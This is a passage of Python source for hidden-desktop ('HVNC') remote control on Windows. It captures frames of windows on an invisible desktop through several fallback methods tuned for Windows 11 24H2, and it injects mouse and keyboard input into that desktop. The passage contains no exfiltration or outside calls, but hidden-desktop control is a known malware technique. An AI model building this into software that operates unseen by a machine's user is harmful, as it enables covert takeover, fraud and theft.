        env_mode = os.getenv("RC_HVNC_CAPTURE_MODE", "").strip().lower()
        if env_mode == "printwindow":
            return True
        if env_mode == "bitblt":
            return False
        
        try:
            # Get Windows build number
            import winreg
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                               r"SOFTWARE\Microsoft\Windows NT\CurrentVersion") as key:
                build_str = winreg.QueryValueEx(key, "CurrentBuildNumber")[0]
                build = int(build_str)
                
                # Windows 11 24H2 starts at build 26100
                if build >= 26100:
                    logger.info("Detected Windows 11 24H2+ (build %d), using PrintWindow", build)
                    return True
                    
                # Windows 11 23H2 is build 22631, earlier builds may also have issues
                if build >= 22000:  # Windows 11
                    logger.info("Detected Windows 11 (build %d), will auto-detect capture mode", build)
                    # Don't force PrintWindow but be ready to switch
                    return False
                    
        except Exception as e:
            logger.debug("Could not detect Windows version: %s", e)
        
        return False
    
    def start_capture(self) -> bool:
        """Start the capture thread."""
        if self._capture_thread is not None and self._capture_thread.is_alive():
            return True
        
        # Capture thread - will STAY on hidden desktop
        self._capture_thread = threading.Thread(target=self._capture_loop, daemon=True)
        self._capture_thread.start()
        
        # Wait for thread to initialize on hidden desktop
        if not self._initialized.wait(timeout=5.0):
            logger.error("Capture thread failed to initialize")
            return False
        return True
    
    @property
    def frame_size(self) -> tuple[int, int]:
        return self._frame_size
    
    @property
    def width(self) -> int:
        return self._width
    
    @property
    def height(self) -> int:
        return self._height
    
    def set_fps(self, fps: int) -> None:
        """Change capture framerate."""
        self._fps = max(1, fps)
        self._interval = 1.0 / self._fps
    
    def get_frame(self, timeout: float = 0.5) -> tuple[bytes | None, tuple[int, int]]:
        """Get the latest captured frame.
        
        Returns:
            Tuple of (frame_data, (width, height))
        """
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            with self._frame_lock:
                if self._frame is not None:
                    return self._frame, self._frame_size
            time.sleep(0.01)
        return None, self._frame_size
    
    def _capture_frame(self) -> bytes | None:
        """Capture a single frame using PrintWindow (Windows 11 24H2 compatible).
        
        On Windows 11 24H2, BitBlt with desktop DC returns black frames due to DWM changes.
        This method uses PrintWindow to capture individual windows and composites them.
        Falls back to BitBlt for older Windows versions where it still works.
        """
        # Get screen dimensions
        screen_width = user32.GetSystemMetrics(SM_CXSCREEN)
        screen_height = user32.GetSystemMetrics(SM_CYSCREEN)
        
        if screen_width <= 0 or screen_height <= 0:
            screen_width = self._width
            screen_height = self._height
        
        # Log first size detection
        if not hasattr(self, '_size_logged'):
            logger.info("Hidden desktop screen size: %dx%d", screen_width, screen_height)
            self._size_logged = True
        
        # Update frame size if different
        if (screen_width, screen_height) != self._frame_size:
            self._frame_size = (screen_width, screen_height)
            self._width = screen_width
            self._height = screen_height
            logger.info("Screen size updated: %dx%d", screen_width, screen_height)
        
        # Check if we should use PrintWindow mode
        # After repeated BitBlt failures, switch to PrintWindow mode permanently
        use_printwindow = getattr(self, '_use_printwindow_mode', False)
        
        if not use_printwindow:
            # Try BitBlt first (faster on older Windows)
            frame = self._capture_frame_bitblt(screen_width, screen_height)
            if frame:
                # Check if frame has content (not all black)
                if self._frame_has_content(frame):
                    return frame
                else:
                    # BitBlt returned empty frame - track failures
                    if not hasattr(self, '_empty_frame_count'):
                        self._empty_frame_count = 0
                    self._empty_frame_count += 1
                    
                    if self._empty_frame_count >= 10:
                        logger.warning("BitBlt returns empty frames, switching to PrintWindow mode")
                        self._use_printwindow_mode = True
            else:
                # BitBlt failed completely
                if not hasattr(self, '_bitblt_fail_count'):
                    self._bitblt_fail_count = 0
                self._bitblt_fail_count += 1
                
                if self._bitblt_fail_count >= 5:
                    logger.warning("BitBlt failing, switching to PrintWindow mode")
                    self._use_printwindow_mode = True
        
        # Use PrintWindow mode (required for Windows 11 24H2)
        if getattr(self, '_use_printwindow_mode', False):
            frame = self._capture_frame_printwindow(screen_width, screen_height)
            if frame:
                # Check if PrintWindow frame has content
                if self._frame_has_content(frame):
                    return frame
                else:
                    # PrintWindow returned empty frame - track and try alternative
                    if not hasattr(self, '_printwindow_empty_count'):
                        self._printwindow_empty_count = 0
                    self._printwindow_empty_count += 1
                    
                    if self._printwindow_empty_count >= 10:
                        if not hasattr(self, '_trying_alternative'):
                            logger.warning(
                                "PrintWindow returns empty frames, trying alternative WM_PRINT method"
                            )
                            self._trying_alternative = True
        
        # Try alternative capture method (WM_PRINT) if others failed
        if getattr(self, '_trying_alternative', False):
            frame = self._capture_frame_alternative(screen_width, screen_height)
            if frame and self._frame_has_content(frame):
                return frame
        
        # Return whatever we have (may be black frame)
        if getattr(self, '_use_printwindow_mode', False):
            return self._capture_frame_printwindow(screen_width, screen_height)
        
        return None
    
    def _frame_has_content(self, frame: bytes) -> bool:
        """Check if a frame has non-black content."""
        if len(frame) < 1000:
            return False
        # Sample pixels throughout the frame
        for i in range(0, min(len(frame), 100000), 10000):
            if i + 3 < len(frame):
                # Check if any color channel > 10 (not pure black)
                if frame[i] > 10 or frame[i+1] > 10 or frame[i+2] > 10:
                    return True
        return False
    
    def _capture_frame_bitblt(self, screen_width: int, screen_height: int) -> bytes | None:
        """Capture frame using BitBlt (traditional method)."""
        hdc_screen = user32.GetDC(None)
        if not hdc_screen:
            hdc_screen = gdi32.CreateDCW("DISPLAY", None, None, None)
            if not hdc_screen:
                return None
            use_release_dc = False
        else:
            use_release_dc = True
        
        try:
            hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
            if not hdc_mem:
                return None
            
            try:
                hbitmap = gdi32.CreateCompatibleBitmap(hdc_screen, screen_width, screen_height)
                if not hbitmap:
                    return None
                
                try:
                    old_bitmap = gdi32.SelectObject(hdc_mem, hbitmap)
                    
                    # Prime GDI state
                    if not hasattr(self, '_gdi_primed'):
                        gdi32.PatBlt(hdc_mem, 0, 0, 1, 1, BLACKNESS)
                        self._gdi_primed = True
                    
                    # Try BitBlt with CAPTUREBLT
                    result = gdi32.BitBlt(
                        hdc_mem, 0, 0, screen_width, screen_height,
                        hdc_screen, 0, 0, SRCCOPY | CAPTUREBLT
                    )
                    
                    if not result:
                        # Try without CAPTUREBLT
                        result = gdi32.BitBlt(
                            hdc_mem, 0, 0, screen_width, screen_height,
                            hdc_screen, 0, 0, SRCCOPY
                        )
                    
                    if not result:
                        gdi32.SelectObject(hdc_mem, old_bitmap)
                        return None
                    
                    gdi32.SelectObject(hdc_mem, old_bitmap)
                    
                    # Get DIB bits
                    return self._get_bitmap_data(hdc_mem, hbitmap, screen_width, screen_height)
                    
                finally:
                    gdi32.DeleteObject(hbitmap)
            finally:
                gdi32.DeleteDC(hdc_mem)
        finally:
            if use_release_dc:
                user32.ReleaseDC(None, hdc_screen)
            else:
                gdi32.DeleteDC(hdc_screen)
    
    def _capture_frame_printwindow(self, screen_width: int, screen_height: int) -> bytes | None:
        """Capture frame by compositing windows using PrintWindow API.
        
        This is required for Windows 11 24H2 where BitBlt doesn't work with hidden desktop.
        """
        # Get a reference DC for creating compatible bitmaps
        hdc_ref = gdi32.CreateDCW("DISPLAY", None, None, None)
        if not hdc_ref:
            hdc_ref = user32.GetDC(None)
            if not hdc_ref:
                logger.warning("PrintWindow: Failed to get reference DC")
                return None
            use_release = True
        else:
            use_release = False
        
        try:
            # Create memory DC and final bitmap for compositing
            hdc_mem = gdi32.CreateCompatibleDC(hdc_ref)
            if not hdc_mem:
                logger.warning("PrintWindow: Failed to create memory DC")
                return None
            
            try:
                hbitmap = gdi32.CreateCompatibleBitmap(hdc_ref, screen_width, screen_height)
                if not hbitmap:
                    logger.warning("PrintWindow: Failed to create bitmap")
                    return None
                
                try:
                    old_bitmap = gdi32.SelectObject(hdc_mem, hbitmap)
                    
                    # Fill with desktop background color (dark gray)
                    gdi32.PatBlt(hdc_mem, 0, 0, screen_width, screen_height, BLACKNESS)
                    
                    # Enumerate and capture windows on the hidden desktop
                    windows = self._enumerate_desktop_windows()
                    
                    # Diagnostic log for window enumeration
                    if not hasattr(self, '_enum_logged') or self._enum_log_counter >= 100:
                        desktop_name = getattr(self._desktop, '_name', 'unknown') if self._desktop else 'none'
                        logger.info(
                            "PrintWindow DIAGNOSTIC: Found %d windows on desktop '%s'",
                            len(windows), desktop_name
                        )
                        if windows:
                            for i, (hwnd, rect) in enumerate(windows[:5]):  # Log first 5
                                title = self._get_window_title(hwnd)
                                logger.info(
                                    "  Window %d: hwnd=0x%X, title='%s', rect=%s",
                                    i, hwnd, title[:50] if title else '<no title>', rect
                                )
                        self._enum_logged = True
                        self._enum_log_counter = 0
                    else:
                        self._enum_log_counter = getattr(self, '_enum_log_counter', 0) + 1
                    
                    if not windows:
                        # No windows found - return black frame
                        if not hasattr(self, '_no_windows_warned'):
                            logger.warning(
                                "PrintWindow: No windows found on hidden desktop! "
                                "Apps may not be launching on correct desktop."
                            )
                            self._no_windows_warned = True
                        gdi32.SelectObject(hdc_mem, old_bitmap)
                        return self._get_bitmap_data(hdc_mem, hbitmap, screen_width, screen_height)
                    
                    # Reset warning flag if we found windows
                    if hasattr(self, '_no_windows_warned'):
                        del self._no_windows_warned
                    
                    # Sort windows by Z-order (bottom to top for proper compositing)
                    # Reverse because we captured top-to-bottom
                    windows.reverse()
                    
                    captured_count = 0
                    failed_count = 0
                    for hwnd, rect in windows:
                        win_left, win_top, win_right, win_bottom = rect
                        win_width = win_right - win_left
                        win_height = win_bottom - win_top
                        
                        if win_width <= 0 or win_height <= 0:
                            continue
                        
                        # Capture this window using PrintWindow
                        win_bitmap = self._capture_window_printwindow(hwnd, win_width, win_height)
                        if win_bitmap:
                            # Create temporary DC for the window bitmap
                            hdc_win = gdi32.CreateCompatibleDC(hdc_ref)
                            if hdc_win:
                                try:
                                    old_win_bmp = gdi32.SelectObject(hdc_win, win_bitmap)
                                    
                                    # Composite onto main frame
                                    gdi32.BitBlt(
                                        hdc_mem, 
                                        max(0, win_left), 
                                        max(0, win_top), 
                                        min(win_width, screen_width - win_left), 
                                        min(win_height, screen_height - win_top),
                                        hdc_win, 0, 0, SRCCOPY
                                    )
                                    captured_count += 1
                                    
                                    gdi32.SelectObject(hdc_win, old_win_bmp)
                                finally:
                                    gdi32.DeleteDC(hdc_win)
                            gdi32.DeleteObject(win_bitmap)
                        else:
                            failed_count += 1
                    
                    # Log capture results
                    if not hasattr(self, '_printwindow_logged'):
                        logger.info(
                            "PrintWindow mode: captured %d windows, failed %d",
                            captured_count, failed_count
                        )
                        self._printwindow_logged = True
                    
                    gdi32.SelectObject(hdc_mem, old_bitmap)
                    return self._get_bitmap_data(hdc_mem, hbitmap, screen_width, screen_height)
                    
                finally:
                    gdi32.DeleteObject(hbitmap)
            finally:
                gdi32.DeleteDC(hdc_mem)
        finally:
            if use_release:
                user32.ReleaseDC(None, hdc_ref)
            else:
                gdi32.DeleteDC(hdc_ref)
    
    def _get_window_title(self, hwnd: int) -> str:
        """Get window title for diagnostic purposes."""
        try:
            length = user32.GetWindowTextLengthW(hwnd)
            if length > 0:
                buffer = ctypes.create_unicode_buffer(length + 1)
                user32.GetWindowTextW(hwnd, buffer, length + 1)
                return buffer.value
        except Exception:
            pass
        return ""
    
    def _enumerate_desktop_windows(self) -> list[tuple[int, tuple[int, int, int, int]]]:
        """Enumerate visible windows on the current desktop.
        
        Returns:
            List of (hwnd, (left, top, right, bottom)) for visible windows
        """
        windows = []
        
        @ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
        def enum_callback(hwnd, lparam):
            # Check if window is visible
            if not user32.IsWindowVisible(hwnd):
                return True
            
            # Skip minimized windows
            if user32.IsIconic(hwnd):
                return True
            
            # Get window style
            style = user32.GetWindowLongW(hwnd, GWL_STYLE)
            ex_style = user32.GetWindowLongW(hwnd, GWL_EXSTYLE)
            
            # Skip invisible windows
            if not (style & WS_VISIBLE):
                return True
            
            # Get window rect
            rect = RECT()
            if not user32.GetWindowRect(hwnd, ctypes.byref(rect)):
                return True
            
            width = rect.right - rect.left
            height = rect.bottom - rect.top
            
            # Skip tiny windows
            if width < 10 or height < 10:
                return True
            
            windows.append((hwnd, (rect.left, rect.top, rect.right, rect.bottom)))
            return True
        
        # Use EnumDesktopWindows with current desktop handle
        if self._desktop and self._desktop._handle:
            user32.EnumDesktopWindows(self._desktop._handle, enum_callback, 0)
        else:
            # Fallback to EnumWindows
            user32.EnumWindows(enum_callback, 0)
        
        return windows
    
    def _capture_window_printwindow(self, hwnd: int, width: int, height: int) -> int | None:
        """Capture a single window using PrintWindow API.
        
        Returns:
            HBITMAP handle or None on failure
        """
        # Get window DC
        hwnd_dc = user32.GetWindowDC(hwnd)
        if not hwnd_dc:
            return None
        
        try:
            # Create memory DC and bitmap
            mem_dc = gdi32.CreateCompatibleDC(hwnd_dc)
            if not mem_dc:
                return None
            
            try:
                bitmap = gdi32.CreateCompatibleBitmap(hwnd_dc, width, height)
                if not bitmap:
                    gdi32.DeleteDC(mem_dc)
                    return None
                
                old_bitmap = gdi32.SelectObject(mem_dc, bitmap)
                
                # Try PrintWindow with PW_RENDERFULLCONTENT (best for DWM windows)
                result = user32.PrintWindow(hwnd, mem_dc, PW_RENDERFULLCONTENT)
                
                if not result:
                    # Fallback: try without PW_RENDERFULLCONTENT
                    result = user32.PrintWindow(hwnd, mem_dc, 0)
                
                if not result:
                    # Last resort: try BitBlt from window DC
                    gdi32.BitBlt(mem_dc, 0, 0, width, height, hwnd_dc, 0, 0, SRCCOPY)
                
                gdi32.SelectObject(mem_dc, old_bitmap)
                return bitmap  # Caller must delete this bitmap
                
            except Exception:
                gdi32.DeleteDC(mem_dc)
                return None
            finally:
                gdi32.DeleteDC(mem_dc)
        finally:
            user32.ReleaseDC(hwnd, hwnd_dc)
    
    def _get_bitmap_data(self, hdc: int, hbitmap: int, width: int, height: int) -> bytes | None:
        """Extract BGRA data from a bitmap."""
        bi = BITMAPINFO()
        bi.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
        bi.bmiHeader.biWidth = width
        bi.bmiHeader.biHeight = -height  # Negative = top-down
        bi.bmiHeader.biPlanes = 1
        bi.bmiHeader.biBitCount = 32
        bi.bmiHeader.biCompression = BI_RGB
        
        buffer_size = width * height * 4
        buffer = ctypes.create_string_buffer(buffer_size)
        
        result = gdi32.GetDIBits(
            hdc,
            hbitmap,
            0,
            height,
            buffer,
            ctypes.byref(bi),
            DIB_RGB_COLORS,
        )
        
        if result == 0:
            return None
        
        # Log first successful capture
        if not hasattr(self, '_first_frame_logged'):
            logger.info("First frame captured successfully: %dx%d", width, height)
            self._first_frame_logged = True
        
        return buffer.raw
    
    def _capture_window_wm_print(self, hwnd: int, width: int, height: int) -> int | None:
        """Capture window using WM_PRINT message - alternative to PrintWindow.
        
        This method sends WM_PRINT directly to the window, which can work
        better than PrintWindow for some applications on Windows 11 24H2.
        
        Returns:
            HBITMAP handle or None on failure
        """
        WM_PRINT = 0x0317
        PRF_CLIENT = 0x0004
        PRF_NONCLIENT = 0x0002
        PRF_CHILDREN = 0x0010
        PRF_OWNED = 0x0020
        PRF_ERASEBKGND = 0x0008
        
        # Get DC for creating compatible objects
        screen_dc = user32.GetDC(None)
        if not screen_dc:
            return None
        
        try:
            # Create memory DC and bitmap
            mem_dc = gdi32.CreateCompatibleDC(screen_dc)
            if not mem_dc:
                return None
            
            try:
                bitmap = gdi32.CreateCompatibleBitmap(screen_dc, width, height)
                if not bitmap:
                    gdi32.DeleteDC(mem_dc)
                    return None
                
                old_bitmap = gdi32.SelectObject(mem_dc, bitmap)
                
                # Fill with white first
                gdi32.PatBlt(mem_dc, 0, 0, width, height, WHITENESS)
                
                # Send WM_PRINT message to the window
                flags = PRF_CLIENT | PRF_NONCLIENT | PRF_CHILDREN | PRF_ERASEBKGND
                user32.SendMessageW(hwnd, WM_PRINT, mem_dc, flags)
                
                gdi32.SelectObject(mem_dc, old_bitmap)
                return bitmap
                
            finally:
                gdi32.DeleteDC(mem_dc)
        finally:
            user32.ReleaseDC(None, screen_dc)
    
    def _capture_frame_alternative(self, screen_width: int, screen_height: int) -> bytes | None:
        """Alternative capture method using WM_PRINT messages.
        
        This is a fallback for when both BitBlt and PrintWindow fail on Win11 24H2.
        It sends WM_PRINT directly to windows which may have better compatibility.
        """
        # Get a reference DC
        hdc_ref = user32.GetDC(None)
        if not hdc_ref:
            return None
        
        try:
            # Create memory DC and final bitmap
            hdc_mem = gdi32.CreateCompatibleDC(hdc_ref)
            if not hdc_mem:
                return None
            
            try:
                hbitmap = gdi32.CreateCompatibleBitmap(hdc_ref, screen_width, screen_height)
                if not hbitmap:
                    return None
                
                try:
                    old_bitmap = gdi32.SelectObject(hdc_mem, hbitmap)
                    
                    # Fill with dark background
                    gdi32.PatBlt(hdc_mem, 0, 0, screen_width, screen_height, BLACKNESS)
                    
                    # Enumerate windows
                    windows = self._enumerate_desktop_windows()
                    
                    if not windows:
                        gdi32.SelectObject(hdc_mem, old_bitmap)
                        return self._get_bitmap_data(hdc_mem, hbitmap, screen_width, screen_height)
                    
                    windows.reverse()  # Bottom to top
                    
                    captured = 0
                    for hwnd, rect in windows:
                        win_left, win_top, win_right, win_bottom = rect
                        win_width = win_right - win_left
                        win_height = win_bottom - win_top
                        
                        if win_width <= 0 or win_height <= 0:
                            continue
                        
                        # Try WM_PRINT method
                        win_bitmap = self._capture_window_wm_print(hwnd, win_width, win_height)
                        if not win_bitmap:
                            # Fallback to PrintWindow
                            win_bitmap = self._capture_window_printwindow(hwnd, win_width, win_height)
                        
                        if win_bitmap:
                            hdc_win = gdi32.CreateCompatibleDC(hdc_ref)
                            if hdc_win:
                                try:
                                    old_win = gdi32.SelectObject(hdc_win, win_bitmap)
                                    gdi32.BitBlt(
                                        hdc_mem,
                                        max(0, win_left),
                                        max(0, win_top),
                                        min(win_width, screen_width - win_left),
                                        min(win_height, screen_height - win_top),
                                        hdc_win, 0, 0, SRCCOPY
                                    )
                                    captured += 1
                                    gdi32.SelectObject(hdc_win, old_win)
                                finally:
                                    gdi32.DeleteDC(hdc_win)
                            gdi32.DeleteObject(win_bitmap)
                    
                    if not hasattr(self, '_alt_capture_logged'):
                        logger.info("Alternative capture (WM_PRINT): captured %d windows", captured)
                        self._alt_capture_logged = True
                    
                    gdi32.SelectObject(hdc_mem, old_bitmap)
                    return self._get_bitmap_data(hdc_mem, hbitmap, screen_width, screen_height)
                    
                finally:
                    gdi32.DeleteObject(hbitmap)
            finally:
                gdi32.DeleteDC(hdc_mem)
        finally:
            user32.ReleaseDC(None, hdc_ref)
    
    def _capture_loop(self) -> None:
        """Main capture loop - runs entirely on hidden desktop."""
        logger.info("Capture thread starting...")
        
        # Switch this thread to hidden desktop PERMANENTLY
        if not self._desktop.switch_to():
            logger.error("Failed to switch capture thread to hidden desktop!")
            self._initialized.set()
            return
        
        logger.info("Capture thread switched to hidden desktop: %s", self._desktop.name)
        
        # Signal initialization early to allow WebRTC connection to proceed
        self._initialized.set()
        
        # Give explorer a moment to start creating windows
        time.sleep(1.0)
        
        # Force GDI initialization more aggressively
        # Create multiple DCs and resources to ensure GDI is fully initialized
        gdi_ready = False
        for attempt in range(5):
            test_dc = user32.GetDC(None)
            if test_dc:
                # Create several test resources to force GDI initialization
                mem_dc = gdi32.CreateCompatibleDC(test_dc)
                if mem_dc:
                    test_bmp = gdi32.CreateCompatibleBitmap(test_dc, 100, 100)
                    if test_bmp:
                        # Select bitmap into DC and draw something
                        old_bmp = gdi32.SelectObject(mem_dc, test_bmp)
                        BLACKNESS = 0x00000042
                        WHITENESS = 0x00FF0062
                        gdi32.PatBlt(mem_dc, 0, 0, 100, 100, WHITENESS)
                        gdi32.PatBlt(mem_dc, 0, 0, 50, 50, BLACKNESS)
                        gdi32.SelectObject(mem_dc, old_bmp)
                        gdi32.DeleteObject(test_bmp)
                    gdi32.DeleteDC(mem_dc)
                user32.ReleaseDC(None, test_dc)
                gdi_ready = True
                logger.debug("GDI initialization attempt %d successful", attempt + 1)
            time.sleep(0.3)
        
        if not gdi_ready:
            logger.warning("GDI initialization may not be complete")
        
        # Wait for actual window content with shorter intervals initially
        # then longer intervals if still failing
        capture_ready = False
        total_wait = 0.0
        max_wait = 15.0  # Maximum 15 seconds total wait
        
        # Start with short intervals, gradually increase
        for retry in range(30):
            if self._stop_event.is_set():
                return
                
            test_frame = self._capture_frame()
            if test_frame:
                # Verify it's not an empty/black frame by checking some pixels
                # BGRA format - check if any pixel is not pure black
                has_content = False
                if len(test_frame) > 1000:
                    # Check every 10000th pixel in the frame
                    for i in range(0, min(len(test_frame), 100000), 10000):
                        if i + 3 < len(test_frame):
                            # Check if any color channel > 10 (not pure black)
                            if test_frame[i] > 10 or test_frame[i+1] > 10 or test_frame[i+2] > 10:
                                has_content = True
                                break
                
                if has_content or retry > 15:  # Accept black frame after many retries
                    logger.info("Desktop capture ready after %.1fs (%d retries, has_content=%s)", 
                               total_wait, retry, has_content)
                    capture_ready = True
                    break
            
            # Adaptive wait time - shorter at first, longer later
            if retry < 5:
                wait_time = 0.2
            elif retry < 10:
                wait_time = 0.3
            elif retry < 20:
                wait_time = 0.5
            else:
                wait_time = 0.7
            
            total_wait += wait_time
            if total_wait >= max_wait:
                logger.warning("Desktop capture timeout after %.1fs", total_wait)
                break
                
            time.sleep(wait_time)
        
        if not capture_ready:
            logger.warning("Desktop capture starting with potentially incomplete initialization")
        
        frame_count = 0
        fail_count = 0
        max_fail_log = 5
        last_success_time = time.monotonic()
        
        while not self._stop_event.is_set():
            start = time.monotonic()
            
            try:
                frame = self._capture_frame()
                if frame:
                    with self._frame_lock:
                        self._frame = frame
                    frame_count += 1
                    fail_count = 0
                    last_success_time = start
                    if frame_count % 300 == 0:
                        logger.debug("Captured %d frames", frame_count)
                else:
                    fail_count += 1
                    time_since_success = start - last_success_time
                    
                    if fail_count <= max_fail_log:
                        logger.debug("Frame capture returned None (count=%d, since_success=%.1fs)", 
                                   fail_count, time_since_success)
                    elif fail_count == max_fail_log + 1:
                        logger.warning("Repeated capture failures, suppressing further logs")
                    
                    # If failing for too long, try to reinitialize GDI
                    if time_since_success > 5.0 and fail_count % 30 == 0:
                        logger.info("Attempting GDI reinitialization after %.1fs of failures", time_since_success)
                        test_dc = user32.GetDC(None)
                        if test_dc:
                            user32.ReleaseDC(None, test_dc)
            except Exception as exc:
                logger.debug("Capture error: %s", exc)
            
            elapsed = time.monotonic() - start
            sleep_time = max(0.001, self._interval - elapsed)
            self._stop_event.wait(sleep_time)
        
        logger.info("Capture loop stopped, captured %d frames total", frame_count)
    
    def close(self) -> None:
        """Stop capture and cleanup."""
        self._stop_event.set()
        if self._capture_thread is not None and self._capture_thread.is_alive():
            self._capture_thread.join(timeout=2.0)


class HiddenDesktopInput:
    """Sends input to a hidden desktop.
    
    The input thread STAYS on the hidden desktop permanently.
    This is required because SendInput sends to the CURRENT thread's desktop.
    """
    
    def __init__(self, desktop: HiddenDesktop, screen_size: tuple[int, int] = (1920, 1080)):
        """Initialize input controller.
        
        Args:
            desktop: Hidden desktop to send input to
            screen_size: Screen dimensions for coordinate normalization
        """
        self._desktop = desktop
        self._screen_width, self._screen_height = screen_size
        self._stop_event = threading.Event()
        self._queue: queue.Queue = queue.Queue()
        self._initialized = threading.Event()
        
        # Start input thread - will STAY on hidden desktop
        self._input_thread = threading.Thread(target=self._input_loop, daemon=True)
        self._input_thread.start()
        
        # Wait for thread to initialize on hidden desktop
        if not self._initialized.wait(timeout=5.0):
            logger.error("Input thread failed to initialize")
        
        logger.info("Input controller initialized for hidden desktop")
    
    def set_screen_size(self, width: int, height: int) -> None:
        """Update screen size for coordinate normalization."""
        self._screen_width = width
        self._screen_height = height
    
    def _normalize_coords(self, x: int, y: int) -> tuple[int, int]:
        """Convert screen coords to absolute coords (0-65535 range)."""
        abs_x = int((x * 65535) / self._screen_width)
        abs_y = int((y * 65535) / self._screen_height)
        return abs_x, abs_y
    
    def _send_mouse_input(self, flags: int, x: int = 0, y: int = 0, data: int = 0) -> None:
        """Send mouse input using SendInput."""
        abs_x, abs_y = self._normalize_coords(x, y)
        
        inp = INPUT()
        inp.type = INPUT_MOUSE
        inp.union.mi.dx = abs_x
        inp.union.mi.dy = abs_y
        inp.union.mi.mouseData = data
        inp.union.mi.dwFlags = flags | MOUSEEVENTF_ABSOLUTE
        inp.union.mi.time = 0
        inp.union.mi.dwExtraInfo = 0  # NULL pointer
        
        user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUT))
    
    def _send_keyboard_input(self, vk_code: int, scan_code: int = 0, flags: int = 0) -> None:
        """Send keyboard input using SendInput."""
        inp = INPUT()
        inp.type = INPUT_KEYBOARD
        inp.union.ki.wVk = vk_code
        inp.union.ki.wScan = scan_code
        inp.union.ki.dwFlags = flags
        inp.union.ki.time = 0
        inp.union.ki.dwExtraInfo = 0  # NULL pointer
        
        user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUT))
    
    def mouse_move(self, x: int, y: int) -> None:
        """Queue mouse move command."""
        self._queue.put(("mouse_move", x, y))
    
    def mouse_down(self, x: int, y: int, button: str = "left") -> None:
        """Queue mouse down command."""
        self._queue.put(("mouse_down", x, y, button))
    
    def mouse_up(self, x: int, y: int, button: str = "left") -> None:
        """Queue mouse up command."""
        self._queue.put(("mouse_up", x, y, button))
    
    def mouse_click(self, x: int, y: int, button: str = "left") -> None:
        """Queue mouse click command."""
        self._queue.put(("mouse_click", x, y, button))
    
    def mouse_scroll(self, x: int, y: int, delta_x: int, delta_y: int) -> None:
        """Queue mouse scroll command."""
        self._queue.put(("mouse_scroll", x, y, delta_x, delta_y))
    
    def key_down(self, vk_code: int, scan_code: int = 0) -> None:
        """Queue key down command."""
        self._queue.put(("key_down", vk_code, scan_code))
    
    def key_up(self, vk_code: int, scan_code: int = 0) -> None:
        """Queue key up command."""
        self._queue.put(("key_up", vk_code, scan_code))
    
    def type_char(self, char: str) -> None:
        """Queue character input."""
        self._queue.put(("type_char", char))
    
    def type_text(self, text: str) -> None:
        """Queue text input."""
        self._queue.put(("type_text", text))
    
    def _execute_input(self, cmd: tuple) -> None:
        """Execute a single input command."""
        action = cmd[0]
        
        if action == "mouse_move":
            _, x, y = cmd
            self._send_mouse_input(MOUSEEVENTF_MOVE, x, y)
            
        elif action == "mouse_down":
            _, x, y, button = cmd
            self._send_mouse_input(MOUSEEVENTF_MOVE, x, y)
            if button == "left":
                self._send_mouse_input(MOUSEEVENTF_LEFTDOWN, x, y)
            elif button == "right":
                self._send_mouse_input(MOUSEEVENTF_RIGHTDOWN, x, y)
            elif button == "middle":
                self._send_mouse_input(MOUSEEVENTF_MIDDLEDOWN, x, y)
                
        elif action == "mouse_up":
            _, x, y, button = cmd
            if button == "left":
                self._send_mouse_input(MOUSEEVENTF_LEFTUP, x, y)
            elif button == "right":
                self._send_mouse_input(MOUSEEVENTF_RIGHTUP, x, y)
            elif button == "middle":
                self._send_mouse_input(MOUSEEVENTF_MIDDLEUP, x, y)
                
        elif action == "mouse_click":
            _, x, y, button = cmd
            self._send_mouse_input(MOUSEEVENTF_MOVE, x, y)
            if button == "left":
                self._send_mouse_input(MOUSEEVENTF_LEFTDOWN, x, y)
                time.sleep(0.02)
                self._send_mouse_input(MOUSEEVENTF_LEFTUP, x, y)
            elif button == "right":
                self._send_mouse_input(MOUSEEVENTF_RIGHTDOWN, x, y)
                time.sleep(0.02)
                self._send_mouse_input(MOUSEEVENTF_RIGHTUP, x, y)
            elif button == "middle":
                self._send_mouse_input(MOUSEEVENTF_MIDDLEDOWN, x, y)
                time.sleep(0.02)
                self._send_mouse_input(MOUSEEVENTF_MIDDLEUP, x, y)
                
        elif action == "mouse_scroll":
            _, x, y, delta_x, delta_y = cmd
            self._send_mouse_input(MOUSEEVENTF_MOVE, x, y)
            if delta_y != 0:
                self._send_mouse_input(MOUSEEVENTF_WHEEL, x, y, delta_y * 120)
            if delta_x != 0:
                self._send_mouse_input(MOUSEEVENTF_HWHEEL, x, y, delta_x * 120)
                
        elif action == "key_down":
            _, vk_code, scan_code = cmd
            flags = 0
            if vk_code in (0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x2D, 0x2E):
                flags |= KEYEVENTF_EXTENDEDKEY
            self._send_keyboard_input(vk_code, scan_code, flags)
            
        elif action == "key_up":
            _, vk_code, scan_code = cmd
            flags = KEYEVENTF_KEYUP
            if vk_code in (0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x2D, 0x2E):
                flags |= KEYEVENTF_EXTENDEDKEY
            self._send_keyboard_input(vk_code, scan_code, flags)
            
        elif action == "type_char":
            _, char = cmd
            if char:
                inp = INPUT()
                inp.type = INPUT_KEYBOARD
                inp.union.ki.wVk = 0
                inp.union.ki.wScan = ord(char)
                inp.union.ki.dwFlags = KEYEVENTF_UNICODE
                inp.union.ki.time = 0
                inp.union.ki.dwExtraInfo = 0  # NULL pointer
                user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUT))
                inp.union.ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP
                user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUT))
                
        elif action == "type_text":
            _, text = cmd
            for char in text:
                self._execute_input(("type_char", char))
                time.sleep(0.01)
    
    def _input_loop(self) -> None:
        """Main input processing loop - runs entirely on hidden desktop."""
        logger.info("Input thread starting...")
        
        # Switch this thread to hidden desktop PERMANENTLY
        if not self._desktop.switch_to():
            logger.error("Failed to switch input thread to hidden desktop!")
            self._initialized.set()
            return
        
        logger.info("Input thread switched to hidden desktop: %s", self._desktop.name)
        self._initialized.set()
        
        while not self._stop_event.is_set():
            try:
                cmd = self._queue.get(timeout=0.1)
            except queue.Empty:
                continue
            
            try:
                self._execute_input(cmd)
            except Exception as exc:
